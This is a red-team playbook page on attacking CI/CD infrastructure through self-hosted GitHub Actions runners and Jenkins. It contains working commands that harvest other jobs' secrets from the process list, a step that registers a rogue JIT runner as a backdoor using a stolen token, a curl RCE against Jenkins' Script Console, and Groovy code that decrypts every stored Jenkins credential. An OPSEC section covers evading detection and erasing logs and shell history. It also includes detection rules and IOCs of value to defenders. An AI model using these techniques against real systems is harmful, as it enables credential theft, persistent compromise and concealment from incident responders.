# Runner Attacks: Self-Hosted Abuse, Backdoors & Jenkins

ATT&CK: T1199 (Trusted Relationship), T1648 (abuse of automation), T1543 (Create/Modify System
Process — persistence), T1552.001 (Credentials in Files) · CWE-668 (Exposure of Resource to Wrong
Sphere), CWE-306 (Missing Authentication), CWE-269 (Improper Privilege Management).

## Theory / Mechanism

**Self-hosted runners are designed to execute arbitrary code, are non-ephemeral by default, and
usually sit inside the internal network with cached creds.** That makes them an ideal pivot.

- **Non-ephemeral reuse.** A persistent runner reuses the same OS/filesystem across jobs. If a job is
  compromised (e.g. via a fork PR / pwn request reaching a `self-hosted` label), the attacker can drop
  background processes, tamper with the toolchain, or harvest secrets that *other* jobs pass as CLI
  args (visible via `ps -ef -w`). GitHub explicitly warns: self-hosted runners "can be persistently
  compromised by untrusted code in a workflow" and "should almost never be used for public repos."
- **Naive auto-destroy is insufficient.** There is no guarantee a runner runs only one job; secrets
  from a concurrent job leak via the process list. The fix is `--ephemeral` (one job per runner) plus
  JIT registration — not auto-scaling persistent runners.
- **Runner backdoor.** An attacker registers a rogue runner (or weaponizes a vulnerable workflow on a
  persistent runner) so the runner becomes a C2 implant whose traffic is *all to github.com* — blind
  to most network defenses. Demonstrated at scale by the Shai-Hulud worm (Nov 2025) installing rogue
  runners and using intentionally-vulnerable workflows as a C2 channel.
- **Docker socket exposure.** If `/var/run/docker.sock` is mounted into the runner container, a job
  controls the host (container escape -> host root).
- **Jenkins (CWE-306/269).** The Groovy **Script Console** (`/script`) runs arbitrary Groovy in the
  controller JVM — equivalent to full admin: read files, **decrypt stored credentials**, reconfigure
  security. Exposed/weak-auth `/script` => unauthenticated RCE; actively abused for cryptomining (2024).

## Working offensive techniques (authorized)

### A. Recon a runner you've landed on (during an engagement)
```bash
bash scripts/runner_recon.sh
# Enumerates: runner type (ephemeral vs persistent), _diag/_work, .credentials & .runner config,
# RUNNER_*/ACTIONS_* env, mounted docker.sock, cloud metadata (IMDS), secrets passed as CLI args
# (ps -ef -w), cached git creds (~/.git-credentials, .netrc), and outbound reachability.
```

### B. Steal another job's secrets via the process list (concurrency leak)
```bash
# Persistent runner running >1 job: secrets passed as args are visible to any job on the box
while :; do ps -ww -eo pid,cmd | grep -Ei 'token|secret|password|AKIA|ghp_|--password' \
  | grep -v grep; sleep 1; done
```

### C. Register a rogue ephemeral (JIT) runner as a backdoor (with a stolen org/admin token)
```bash
# JIT config via REST — runner that auto-exits after one job (low forensic footprint)
gh api -X POST /repos/ORG/REPO/actions/runners/generate-jitconfig \
  -f name=ci-cache-7 -F runner_group_id=1 -f 'labels[]=self-hosted' -f work_folder=_work \
  -q .encoded_jit_config > jit.b64
./run.sh --jitconfig "$(cat jit.b64)"        # registers, runs one queued (attacker) job, exits
```

### D. Jenkins Script Console RCE + credential decryption
```bash
# Unauthenticated/weakly-authed /script => RCE
curl -s "http://JENKINS:8080/script" --data-urlencode \
  'script=def p="id".execute();println p.text'
```
```groovy
// In the Groovy console: decrypt ALL stored Jenkins credentials
import com.cloudbees.plugins.credentials.CredentialsProvider
import jenkins.model.Jenkins
CredentialsProvider.lookupCredentials(com.cloudbees.plugins.credentials.common.StandardCredentials,
  Jenkins.instance, null, null).each { c ->
  println("${c.id} :: " + (c.properties.findAll{it.key in ['username','password','secret','privateKey']}))
}
```
CVE-2024-23897 (Jenkins < 2.441 / < 2.426.3 LTS): arbitrary file read via the CLI `@file` arg
expansion — read `secret.key`/`credentials.xml` then decrypt offline. See `gquere/pwn_jenkins`.

## Modern 2024-2026 variants (verified)

- **Shai-Hulud worm (Nov 24 2025)** installed rogue self-hosted runners on compromised machines and
  used vulnerable workflows as a C2 channel — all traffic to github.com, evading network defenses.
- **`pull_request_target` -> default-branch source (Dec 2025).** Now resolves workflow source from the
  default branch, blocking exploitation of *outdated* vulnerable workflows on stale branches; does not
  stop fork-code RCE on a self-hosted runner if the workflow checks out PR head.
- **Jenkins Script Console cryptomining (Jul 2024, Trend Micro).** Exposed `/script` abused to run a
  base64 Groovy stage that pulled and ran a miner, persisting via cron/`systemd-run`.
- **CVE-2024-23897 (Jenkins).** Arbitrary file read; widely scanned/exploited in 2024.

## Detection

**Sigma — rogue runner registration in the GitHub audit log:**
```yaml
title: New Self-Hosted Runner Registered (Possible Backdoor)
id: 2f6b88c0-3a17-4d51-9e22-cicdrun0001
logsource: { product: github, service: audit }
detection:
  sel:
    action:
      - 'self_hosted_runner.register'
      - 'self_hosted_runner.online'
  condition: sel
level: medium
falsepositives: [ legitimate runner autoscaling ]
```

**Host EDR — persistence / leak on a runner:** `Runner.Worker`/`runsvc` spawning long-lived
non-build processes (nc, ssh reverse tunnels, miners); reads of `.credentials`/`credentials.xml`;
processes scraping `ps`; mounts of `/var/run/docker.sock`. Deploy `step-security/harden-runner` to
allowlist egress and emit a per-job network/file audit.

**Jenkins:** access-log `POST /script` or `/scriptText`; controller JVM spawning shells; sudden
crypto-miner CPU. Alert on `/script` reachable without auth.

**IOCs:** unexpected runner names/labels; runner host outbound to non-github.com C2; `--ephemeral`
absent on a public-repo runner; Groovy `CredentialsProvider.lookupCredentials` in console history;
base64 Groovy in Jenkins logs.

## OPSEC

- Touches: runner FS (`_work`, `_diag` logs), process table, GitHub audit log (runner register/online,
  job runs), Jenkins access/audit logs. Rogue-runner registration is logged org-side.
- Cleanup: on a self-hosted runner remove dropped files, clear `_diag`/`_work` job logs, deregister
  the rogue runner (`config.sh remove --token …`) and unset shell history; you cannot remove the
  GitHub audit entry. Ephemeral/JIT runners leave the least trace (auto-deregister after one job).
- Evasion: prefer JIT/ephemeral runners and benign names (`ci-cache-N`); keep all C2 to github.com to
  blend with normal runner traffic; harvest concurrency-leaked secrets rather than dropping tooling;
  on Jenkins use the in-memory Script Console (no file artifacts) over writing a script to disk.

## References

- Sysdig, "How threat actors are using self-hosted GitHub Actions runners as backdoors."
- GitHub Docs, "Secure use reference" (self-hosted runner risks; ephemeral/JIT runners).
- Wiz, "Hardening GitHub Actions: Lessons from Recent Attacks."
- Trend Micro, "Turning Jenkins Into a Cryptomining Machine From an Attacker's Perspective" (2024).
- Jenkins Security: Script Console docs; CVE-2024-23897; `gquere/pwn_jenkins`; Rapid7 jenkins_script_console.
- StepSecurity / NVIDIA GroovyWaiter (Jenkins at scale).
